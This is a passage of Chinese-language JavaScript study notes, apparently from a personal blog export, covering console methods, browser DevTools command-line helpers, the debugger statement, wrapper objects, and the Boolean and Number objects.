<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.dirxml([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="built_in">console</span>.dir([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br></pre></td></tr></table></figure>

<h5 id="4-2-6-console-assert"><a href="#4-2-6-console-assert" class="headerlink" title="4.2.6 console.assert()"></a>4.2.6 console.assert()</h5><p><code>console.assert</code>方法主要用于程序运行过程中，进行条件判断，如果不满足条件，就显示一个错误，但不会中断程序执行。这样就相当于提示用户，内部状态不正确。<br>它接受两个参数，第一个参数是表达式，第二个参数是字符串。只有当第一个参数为<code>false</code>，才会提示有错误，在控制台输出第二个参数，否则不会有任何结果。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.assert(<span class="literal">false</span>, <span class="string">&#x27;判断条件不成立&#x27;</span>)</span><br><span class="line"><span class="comment">// Assertion failed: 判断条件不成立</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 相当于</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;判断条件不成立&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">  <span class="built_in">console</span>.error(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面是一个例子，判断子节点的个数是否大于等于500</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.assert(list.childNodes.length &lt; <span class="number">500</span>, <span class="string">&#x27;节点个数大于等于500&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>上面代码中，如果符合条件的节点小于500个，不会有任何输出；只有大于等于500时，才会在控制台提示错误，并且显示指定文本</p>
<h5 id="4-2-7-console-time-，console-timeEnd"><a href="#4-2-7-console-time-，console-timeEnd" class="headerlink" title="4.2.7 console.time()，console.timeEnd()"></a>4.2.7 console.time()，console.timeEnd()</h5><p>这两个方法用于计时，可以算出一个操作所花费的准确时间</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.time(<span class="string">&#x27;Array initialize&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> array= <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1000000</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = array.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">  array[i] = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.timeEnd(<span class="string">&#x27;Array initialize&#x27;</span>);</span><br><span class="line"><span class="comment">// Array initialize: 1914.481ms</span></span><br></pre></td></tr></table></figure>
<p><code>time</code>方法表示计时开始，<code>timeEnd</code>方法表示计时结束。它们的参数是计时器的名称。调用<code>timeEnd</code>方法之后，控制台会显示“计时器名称: 所耗费的时间”</p>
<h5 id="4-2-8-console-group-，console-groupEnd-，console-groupCollapsed"><a href="#4-2-8-console-group-，console-groupEnd-，console-groupCollapsed" class="headerlink" title="4.2.8 console.group()，console.groupEnd()，console.groupCollapsed()"></a>4.2.8 console.group()，console.groupEnd()，console.groupCollapsed()</h5><p><code>console.group</code>和<code>console.groupEnd</code>这两个方法用于将显示的信息分组。它只在输出大量信息时有用，分在一组的信息，可以用鼠标折叠/展开</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.group(<span class="string">&#x27;一级分组&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;一级分组的内容&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.group(<span class="string">&#x27;二级分组&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;二级分组的内容&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.groupEnd(); <span class="comment">// 二级分组结束</span></span><br><span class="line"><span class="built_in">console</span>.groupEnd(); <span class="comment">// 一级分组结束</span></span><br></pre></td></tr></table></figure>
<p>上面代码会将“二级分组”显示在“一级分组”内部，并且“一级分组”和“二级分组”前面都有一个折叠符号，可以用来折叠本级的内容<br><code>console.groupCollapsed</code>方法与<code>console.group</code>方法很类似，唯一的区别是该组的内容，在第一次显示时是收起的（collapsed），而不是展开的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.groupCollapsed(<span class="string">&#x27;Fetching Data&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Request Sent&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.error(<span class="string">&#x27;Error: Server not responding (500)&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.groupEnd();</span><br></pre></td></tr></table></figure>
<p>上面代码只显示一行”Fetching Data“，点击后才会展开，显示其中包含的两行</p>
<h5 id="4-2-9-console-trace-，console-clear"><a href="#4-2-9-console-trace-，console-clear" class="headerlink" title="4.2.9 console.trace()，console.clear()"></a>4.2.9 console.trace()，console.clear()</h5><p><code>console.trace</code>方法显示当前执行的代码在堆栈中的调用路径</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.trace()</span><br><span class="line"><span class="comment">// console.trace()</span></span><br><span class="line"><span class="comment">//   (anonymous function)</span></span><br><span class="line"><span class="comment">//   InjectedScript._evaluateOn</span></span><br><span class="line"><span class="comment">//   InjectedScript._evaluateAndWrap</span></span><br><span class="line"><span class="comment">//   InjectedScript.evaluate</span></span><br></pre></td></tr></table></figure>
<p><code>console.clear</code>方法用于清除当前控制台的所有输出，将光标回置到第一行。如果用户选中了控制台的“Preserve log”选项，<code>console.clear</code>方法将不起作用</p>
<h4 id="4-3-控制台命令行-API"><a href="#4-3-控制台命令行-API" class="headerlink" title="4.3 控制台命令行 API"></a>4.3 控制台命令行 API</h4><p>浏览器控制台中，除了使用<code>console</code>对象，还可以使用一些控制台自带的命令行方法</p>
<h5 id="1"><a href="#1" class="headerlink" title="(1)$_"></a>(1)<code>$_</code></h5><p><code>$_</code>属性返回上一个表达式的值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span> + <span class="number">2</span></span><br><span class="line"><span class="comment">// 4</span></span><br><span class="line">$_</span><br><span class="line"><span class="comment">// 4</span></span><br></pre></td></tr></table></figure>
<h5 id="2-0-4"><a href="#2-0-4" class="headerlink" title="(2)$0-$4"></a>(2)<code>$0</code>-<code>$4</code></h5><p>控制台保存了最近5个在 Elements 面板选中的 DOM 元素，<code>$0</code>代表倒数第一个（最近一个），<code>$1</code>代表倒数第二个，以此类推直到<code>$4</code></p>
<h5 id="3-selector"><a href="#3-selector" class="headerlink" title="(3)$(selector)"></a>(3)<code>$(selector)</code></h5><p><code>$(selector)</code>返回第一个匹配的元素，等同于<code>document.querySelector()</code>。注意，如果页面脚本对$有定义，则会覆盖原始的定义。比如，页面里面有 jQuery，控制台执行<code>$(selector)</code>就会采用 jQuery 的实现，返回一个数组。</p>
<h5 id="4-selector"><a href="#4-selector" class="headerlink" title="(4)$$(selector)"></a>(4)<code>$$(selector)</code></h5><p><code>$$(selector)</code>返回选中的 DOM 对象，等同于<code>document.querySelectorAll</code></p>
<h5 id="5-x-path"><a href="#5-x-path" class="headerlink" title="(5)$x(path)"></a>(5)<code>$x(path)</code></h5><p><code>$x(path)</code>方法返回一个数组，包含匹配特定 XPath 表达式的所有 DOM 元素</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$x(<span class="string">&quot;//p[a]&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>上面代码返回所有包含<code>a</code>元素的<code>p</code>元素</p>
<h5 id="6-inspect-object"><a href="#6-inspect-object" class="headerlink" title="(6)inspect(object)"></a>(6)<code>inspect(object)</code></h5><p><code>inspect(object)</code>方法打开相关面板，并选中相应的元素，显示它的细节。DOM 元素在<code>Elements</code>面板中显示，比如<code>inspect(document)</code>会在 <code>Elements</code> 面板显示<code>document</code>元素。JavaScript 对象在控制台面板<code>Profiles</code>面板中显示，比如<code>inspect(window)</code></p>
<h5 id="7-getEventListeners-object"><a href="#7-getEventListeners-object" class="headerlink" title="(7)getEventListeners(object)"></a>(7)<code>getEventListeners(object)</code></h5><p><code>getEventListeners(object)</code>方法返回一个对象，该对象的成员为<code>object</code>登记了回调函数的各种事件（比如<code>click</code>或<code>keydown</code>），每个事件对应一个数组，数组的成员为该事件的回调函数</p>
<h5 id="8-keys-object-，values-object"><a href="#8-keys-object-，values-object" class="headerlink" title="(8)keys(object)，values(object)"></a>(8)<code>keys(object)</code>，<code>values(object)</code></h5><p><code>keys(object)</code>方法返回一个数组，包含<code>object</code>的所有键名。<br><code>values(object)</code>方法返回一个数组，包含<code>object</code>的所有键值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;<span class="string">&#x27;p1&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;p2&#x27;</span>: <span class="string">&#x27;b&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line">keys(o)</span><br><span class="line"><span class="comment">// [&quot;p1&quot;, &quot;p2&quot;]</span></span><br><span class="line">values(o)</span><br><span class="line"><span class="comment">// [&quot;a&quot;, &quot;b&quot;]</span></span><br></pre></td></tr></table></figure>
<h5 id="9-monitorEvents-object-events-，unmonitorEvents-object-events"><a href="#9-monitorEvents-object-events-，unmonitorEvents-object-events" class="headerlink" title="(9)monitorEvents(object[, events]) ，unmonitorEvents(object[, events])"></a>(9)<code>monitorEvents(object[, events]) </code>，<code>unmonitorEvents(object[, events])</code></h5><p><code>monitorEvents(object[, events])</code>方法监听特定对象上发生的特定事件。事件发生时，会返回一个<code>Event</code>对象，包含该事件的相关信息。<code>unmonitorEvents</code>方法用于停止监听</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">monitorEvents(<span class="built_in">window</span>, <span class="string">&quot;resize&quot;</span>);</span><br><span class="line">monitorEvents(<span class="built_in">window</span>, [<span class="string">&quot;resize&quot;</span>, <span class="string">&quot;scroll&quot;</span>])</span><br></pre></td></tr></table></figure>
<p>上面代码分别表示单个事件和多个事件的监听方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">monitorEvents($<span class="number">0</span>, <span class="string">&#x27;mouse&#x27;</span>);</span><br><span class="line">unmonitorEvents($<span class="number">0</span>, <span class="string">&#x27;mousemove&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码表示如何停止监听</p>
<p><code>monitorEvents</code>允许监听同一大类的事件。所有事件可以分成四个大类:</p>
<ul>
<li>mouse：”mousedown”, “mouseup”, “click”, “dblclick”, “mousemove”, “mouseover”, “mouseout”, “mousewheel”</li>
<li>key：”keydown”, “keyup”, “keypress”, “textInput”</li>
<li>touch：”touchstart”, “touchmove”, “touchend”, “touchcancel”</li>
<li>control：”resize”, “scroll”, “zoom”, “focus”, “blur”, “select”, “change”, “submit”, “reset”</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">monitorEvents($(<span class="string">&quot;#msg&quot;</span>), <span class="string">&quot;key&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码表示监听所有<code>key</code>大类的事件</p>
<h5 id="10-其它方法"><a href="#10-其它方法" class="headerlink" title="(10)其它方法"></a>(10)其它方法</h5><p>命令行 API 还提供以下方法:</p>
<ul>
<li><code>clear()</code>：清除控制台的历史。</li>
<li><code>copy(object)</code>：复制特定 DOM 元素到剪贴板。</li>
<li><code>dir(object)</code>：显示特定对象的所有属性，是console.dir方法的别名。</li>
<li><code>dirxml(object)</code>：显示特定对象的 XML 形式，是console.dirxml方法的别名。</li>
</ul>
<h4 id="4-4-debugger语句"><a href="#4-4-debugger语句" class="headerlink" title="4.4 debugger语句"></a>4.4 debugger语句</h4><p><code>debugger</code>语句主要用于除错，作用是设置断点。如果有正在运行的除错工具，程序运行到<code>debugger</code>语句时会自动停下。如果没有除错工具，<code>debugger</code>语句不会产生任何结果，JavaScript 引擎自动跳过这一句<br>Chrome 浏览器中，当代码运行到<code>debugger</code>语句时，就会暂停运行，自动打开脚本源码界面</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i);</span><br><span class="line">  <span class="keyword">if</span> (i === <span class="number">2</span>) <span class="keyword">debugger</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码打印出0，1，2以后，就会暂停，自动打开源码界面，等待进一步处理。</p>
<p><code>well,that&#39;s all for today.</code></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS语法-console对象与控制台</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0018</title>
    <url>/2021/05/14/%E6%89%93%E5%8D%A10018/</url>
    <content><![CDATA[<p><font color=#4e72b8>努力经营当下，直至未来明朗。</font></p>
<h2 id="JS标准库"><a href="#JS标准库" class="headerlink" title="JS标准库"></a>JS标准库</h2><h3 id="4-包装对象"><a href="#4-包装对象" class="headerlink" title="4. 包装对象"></a>4. 包装对象</h3><h4 id="4-1-定义"><a href="#4-1-定义" class="headerlink" title="4.1 定义"></a>4.1 定义</h4><p>对象是 JavaScript 语言最主要的数据类型，三种原始类型的值——数值、字符串、布尔值——在一定条件下，也会自动转为对象，也就是原始类型的“包装对象”（wrapper）<br>所谓“包装对象”，指的是与数值、字符串、布尔值分别相对应的<code>Number</code>、<code>String</code>、<code>Boolean</code>三个原生对象。这三个原生对象可以把原始类型的值变成（包装成）对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> v1 = <span class="keyword">new</span> <span class="built_in">Number</span>(<span class="number">123</span>);</span><br><span class="line"><span class="keyword">var</span> v2 = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&#x27;abc&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> v3 = <span class="keyword">new</span> <span class="built_in">Boolean</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">typeof</span> v1 <span class="comment">// &quot;object&quot;</span></span><br><span class="line"><span class="keyword">typeof</span> v2 <span class="comment">// &quot;object&quot;</span></span><br><span class="line"><span class="keyword">typeof</span> v3 <span class="comment">// &quot;object&quot;</span></span><br><span class="line"></span><br><span class="line">v1 === <span class="number">123</span> <span class="comment">// false</span></span><br><span class="line">v2 === <span class="string">&#x27;abc&#x27;</span> <span class="comment">// false</span></span><br><span class="line">v3 === <span class="literal">true</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>上面代码中，基于原始类型的值，生成了三个对应的包装对象。可以看到，<code>v1</code>、<code>v2</code>、<code>v3</code>都是对象，且与对应的简单类型值不相等<br>包装对象的设计目的，首先是使得“对象”这种类型可以覆盖 JavaScript 所有的值，整门语言有一个通用的数据模型，其次是使得原始类型的值也有办法调用自己的方法。<br><code>Number</code>、<code>String</code>和<code>Boolean</code>这三个原生对象，如果不作为构造函数调用（即调用时不加<code>new</code>），而是作为普通函数调用，常常用于将任意类型的值转为数值、字符串和布尔值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 字符串转为数值</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="string">&#x27;123&#x27;</span>) <span class="comment">// 123</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数值转为字符串</span></span><br><span class="line"><span class="built_in">String</span>(<span class="number">123</span>) <span class="comment">// &quot;123&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数值转为布尔值</span></span><br><span class="line"><span class="built_in">Boolean</span>(<span class="number">123</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面这种数据类型的转换，详见《数据类型转换》一节。<br>总结一下，这三个对象作为构造函数使用（带有<code>new</code>）时，可以将原始类型的值转为对象；作为普通函数使用时（不带有<code>new</code>），可以将任意类型的值，转为原始类型的值。</p>
<h4 id="4-2-实例方法"><a href="#4-2-实例方法" class="headerlink" title="4.2 实例方法"></a>4.2 实例方法</h4><p>三种包装对象各自提供了许多实例方法，详见后文。这里介绍两种它们共同具有、从<code>Object</code>对象继承的方法：<code>valueOf()</code>和<code>toString()</code>。</p>
<h5 id="4-2-1-valueOf"><a href="#4-2-1-valueOf" class="headerlink" title="4.2.1 valueOf()"></a>4.2.1 valueOf()</h5><p><code>valueOf()</code>方法返回包装对象实例对应的原始类型的值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Number</span>(<span class="number">123</span>).valueOf()  <span class="comment">// 123</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&#x27;abc&#x27;</span>).valueOf() <span class="comment">// &quot;abc&quot;</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Boolean</span>(<span class="literal">true</span>).valueOf() <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h5 id="4-2-2-toString"><a href="#4-2-2-toString" class="headerlink" title="4.2.2 toString()"></a>4.2.2 toString()</h5><p><code>toString()</code>方法返回对应的字符串形式。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Number</span>(<span class="number">123</span>).toString() <span class="comment">// &quot;123&quot;</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&#x27;abc&#x27;</span>).toString() <span class="comment">// &quot;abc&quot;</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Boolean</span>(<span class="literal">true</span>).toString() <span class="comment">// &quot;true&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="4-3-原始类型与实例对象的自动转换"><a href="#4-3-原始类型与实例对象的自动转换" class="headerlink" title="4.3 原始类型与实例对象的自动转换"></a>4.3 原始类型与实例对象的自动转换</h4><p>某些场合，原始类型的值会自动当作包装对象调用，即调用包装对象的属性和方法。这时，JavaScript 引擎会自动将原始类型的值转为包装对象实例，并在使用后立刻销毁实例。<br>比如，字符串可以调用<code>length</code>属性，返回字符串的长度。<br>比如，字符串可以调用<code>length</code>属性，返回字符串的长度。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;abc&#x27;</span>.length <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>abc</code>是一个字符串，本身不是对象，不能调用<code>length</code>属性。JavaScript 引擎自动将其转为包装对象，在这个对象上调用<code>length</code>属性。调用结束后，这个临时对象就会被销毁。这就叫原始类型与实例对象的自动转换。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">str.length <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">var</span> strObj = <span class="keyword">new</span> <span class="built_in">String</span>(str)</span><br><span class="line"><span class="comment">// String &#123;</span></span><br><span class="line"><span class="comment">//   0: &quot;a&quot;, 1: &quot;b&quot;, 2: &quot;c&quot;, length: 3, [[PrimitiveValue]]: &quot;abc&quot;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line">strObj.length <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，字符串<code>abc</code>的包装对象提供了多个属性，<code>length</code>只是其中之一<br>自动转换生成的包装对象是只读的，无法修改。所以，字符串无法添加新属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&#x27;Hello World&#x27;</span>;</span><br><span class="line">s.x = <span class="number">123</span>;</span><br><span class="line">s.x <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<p>上面代码为字符串<code>s</code>添加了一个<code>x</code>属性，结果无效，总是返回<code>undefined</code>。<br>另一方面，调用结束后，包装对象实例会自动销毁。这意味着，下一次调用字符串的属性时，实际是调用一个新生成的对象，而不是上一次调用时生成的那个对象，所以取不到赋值在上一个对象的属性。如果要为字符串添加属性，只有在它的原型对象<code>String.prototype</code>上定义（参见《面向对象编程》章节）。</p>
<h4 id="4-4-自定义方法"><a href="#4-4-自定义方法" class="headerlink" title="4.4 自定义方法"></a>4.4 自定义方法</h4><p>除了原生的实例方法，包装对象还可以自定义方法和属性，供原始类型的值直接调用。<br>比如，我们可以新增一个<code>double</code>方法，使得字符串和数字翻倍。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span>.prototype.double = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>.valueOf() + <span class="built_in">this</span>.valueOf();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;abc&#x27;</span>.double()</span><br><span class="line"><span class="comment">// abcabc</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.prototype.double = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>.valueOf() + <span class="built_in">this</span>.valueOf();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(<span class="number">123</span>).double() <span class="comment">// 246</span></span><br></pre></td></tr></table></figure>
<p>上面代码在<code>String</code>和<code>Number</code>这两个对象的原型上面，分别自定义了一个方法，从而可以在所有实例对象上调用。注意，最后一行的<code>123</code>外面必须要加上圆括号，否则后面的点运算符（<code>.</code>）会被解释成小数点。</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS标准库-包装对象</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0019</title>
    <url>/2021/05/14/%E6%89%93%E5%8D%A10019/</url>
    <content><![CDATA[<p><font color=#bed742>如果你是异性，你会不会爱上现在的自己？</font></p>
<h2 id="JS标准库"><a href="#JS标准库" class="headerlink" title="JS标准库"></a>JS标准库</h2><h3 id="5-Boolean对象"><a href="#5-Boolean对象" class="headerlink" title="5. Boolean对象"></a>5. Boolean对象</h3><h4 id="5-1-概述"><a href="#5-1-概述" class="headerlink" title="5.1 概述"></a>5.1 概述</h4><p><code>Boolean</code>对象是 JavaScript 的三个包装对象之一。作为构造函数，它主要用于生成布尔值的包装对象实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> <span class="built_in">Boolean</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">typeof</span> b <span class="comment">// &quot;object&quot;</span></span><br><span class="line">b.valueOf() <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>上面代码的变量<code>b</code>是一个<code>Boolean</code>对象的实例，它的类型是对象，值为布尔值<code>true</code>。<br>注意，<code>false</code>对应的包装对象实例，布尔运算结果也是<code>true</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">new</span> <span class="built_in">Boolean</span>(<span class="literal">false</span>)) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;true&#x27;</span>);</span><br><span class="line">&#125; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">new</span> <span class="built_in">Boolean</span>(<span class="literal">false</span>).valueOf()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;true&#x27;</span>);</span><br><span class="line">&#125; <span class="comment">// 无输出</span></span><br></pre></td></tr></table></figure>
<p>上面代码的第一个例子之所以得到<code>true</code>，是因为<code>false</code>对应的包装对象实例是一个对象，进行逻辑运算时，被自动转化成布尔值<code>true</code>（因为所有对象对应的布尔值都是<code>true</code>）。而实例的<code>valueOf</code>方法，则返回实例对应的原始值，本例为<code>false</code>。</p>
<h4 id="5-2-Boolean-函数的类型转换作用"><a href="#5-2-Boolean-函数的类型转换作用" class="headerlink" title="5.2 Boolean 函数的类型转换作用"></a>5.2 Boolean 函数的类型转换作用</h4><p><code>Boolean</code>对象除了可以作为构造函数，还可以单独使用，将任意值转为布尔值。这时<code>Boolean</code>就是一个单纯的工具方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Boolean</span>(<span class="literal">undefined</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Boolean</span>(<span class="literal">null</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Boolean</span>(<span class="number">0</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Boolean</span>(<span class="string">&#x27;&#x27;</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Boolean</span>(<span class="literal">NaN</span>) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Boolean</span>(<span class="number">1</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Boolean</span>(<span class="string">&#x27;false&#x27;</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Boolean</span>([]) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Boolean</span>(&#123;&#125;) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Boolean</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Boolean</span>(<span class="regexp">/foo/</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中几种得到<code>true</code>的情况，都值得认真记住。<br>顺便提一下，使用双重的否运算符（<code>!</code>）也可以将任意值转为对应的布尔值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">!!<span class="literal">undefined</span> <span class="comment">// false</span></span><br><span class="line">!!<span class="literal">null</span> <span class="comment">// false</span></span><br><span class="line">!!<span class="number">0</span> <span class="comment">// false</span></span><br><span class="line">!!<span class="string">&#x27;&#x27;</span> <span class="comment">// false</span></span><br><span class="line">!!<span class="literal">NaN</span> <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">!!<span class="number">1</span> <span class="comment">// true</span></span><br><span class="line">!!<span class="string">&#x27;false&#x27;</span> <span class="comment">// true</span></span><br><span class="line">!![] <span class="comment">// true</span></span><br><span class="line">!!&#123;&#125; <span class="comment">// true</span></span><br><span class="line">!!<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125; <span class="comment">// true</span></span><br><span class="line">!!<span class="regexp">/foo/</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>最后，对于一些特殊值，<code>Boolean</code>对象前面加不加<code>new</code>，会得到完全相反的结果，必须小心。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">Boolean</span>(<span class="literal">false</span>)) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;true&#x27;</span>);</span><br><span class="line">&#125; <span class="comment">// 无输出</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">new</span> <span class="built_in">Boolean</span>(<span class="literal">false</span>)) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;true&#x27;</span>);</span><br><span class="line">&#125; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Boolean</span>(<span class="literal">null</span>)) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;true&#x27;</span>);</span><br><span class="line">&#125; <span class="comment">// 无输出</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">new</span> <span class="built_in">Boolean</span>(<span class="literal">null</span>)) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;true&#x27;</span>);</span><br><span class="line">&#125; <span class="comment">// true</span></span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS标准库-Boolean对象</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0020</title>
    <url>/2021/05/14/%E6%89%93%E5%8D%A10020/</url>
    <content><![CDATA[<p><font color=#1d953f>即使不开心也不要愁眉不展，因为你不知道谁会爱上你的笑容。</font></p>
<h2 id="JS标准库"><a href="#JS标准库" class="headerlink" title="JS标准库"></a>JS标准库</h2><h3 id="6-Number对象"><a href="#6-Number对象" class="headerlink" title="6. Number对象"></a>6. Number对象</h3><h4 id="6-1-概述"><a href="#6-1-概述" class="headerlink" title="6.1 概述"></a>6.1 概述</h4><p><code>Number</code>对象是数值对应的包装对象，可以作为构造函数使用，也可以作为工具函数使用。<br>作为构造函数时，它用于生成值为数值的对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> n = <span class="keyword">new</span> <span class="built_in">Number</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">typeof</span> n <span class="comment">// &quot;object&quot;</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>上面代码中，<code>Number</code>对象作为构造函数使用，返回一个值为<code>1</code>的对象。<br>作为工具函数时，它可以将任何类型的值转为数值。</p>
